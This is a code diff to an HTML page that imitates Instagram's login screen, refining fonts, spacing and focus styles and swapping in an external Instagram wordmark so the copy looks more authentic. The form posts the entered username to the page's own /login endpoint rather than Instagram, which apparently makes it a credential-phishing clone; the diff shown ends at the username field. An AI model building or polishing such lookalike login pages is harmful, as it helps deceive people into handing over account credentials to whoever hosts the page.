@@ -5,18 +5,26 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram Login</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; }
         .login-container { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; margin-bottom: 10px; }
-        .logo { width: 175px; margin-bottom: 20px; }
-        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 12px; }
-        button { width: 100%; padding: 7px; border: none; background-color: #0095f6; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 5px; }
+        
+        /* Logo styling */
+        .logo { width: 175px; margin-top: 10px; margin-bottom: 30px; }
+        
+        input { width: 100%; padding: 10px; margin-bottom: 8px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 12px; }
+        input:focus { border-color: #a8a8a8; outline: none; }
+        
+        button { width: 100%; padding: 7px; border: none; background-color: #0095f6; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 8px; font-size: 14px; }
         button:hover { background-color: #1877f2; }
-        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; }
+        
+        .divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: bold; }
         .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #dbdbdb; }
-        .divider span { padding: 0 10px; }
-        .fb-login { color: #385185; font-size: 14px; font-weight: bold; cursor: pointer; text-decoration: none; }
-        .forgot { font-size: 12px; color: #00376b; margin-top: 20px; display: block; text-decoration: none; }
+        .divider span { padding: 0 18px; }
+        
+        .fb-login { color: #385185; font-size: 14px; font-weight: bold; cursor: pointer; text-decoration: none; display: block; margin-bottom: 15px; }
+        .forgot { font-size: 12px; color: #00376b; margin-top: 10px; display: block; text-decoration: none; }
+        
         .signup-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 20px; text-align: center; font-size: 14px; }
         .signup-box a { color: #0095f6; text-decoration: none; font-weight: bold; }
     </style>
@@ -24,7 +32,8 @@
 <body>
 
     <div class="login-container">
-        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de40b20.png" alt="Instagram" class="logo">
+        <!-- Working Logo Link -->
+        <img src="https://www.vectorlogo.zone/logos/instagram/instagram-wordmark.svg" alt="Instagram" class="logo">
         
         <form action="/login" method="POST">
             <input type="text" name="username" placeholder="Phone number, username, or email" required>
